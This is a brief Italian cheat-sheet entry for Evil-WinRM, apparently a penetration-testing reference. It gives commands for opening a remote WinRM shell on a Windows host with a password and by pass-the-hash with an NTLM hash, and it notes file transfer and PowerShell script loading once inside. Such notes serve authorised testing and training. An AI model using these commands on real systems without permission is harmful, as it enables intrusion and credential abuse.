# Evil-WinRM - shell remota via WinRM
## Uso base
```
evil-winrm -i 10.0.0.5 -u Administrator -p 'Password123'
evil-winrm -i 10.0.0.5 -u user -H <NTLM_HASH>      # pass-the-hash
```
Una volta dentro: upload/download file, caricamento script PowerShell.
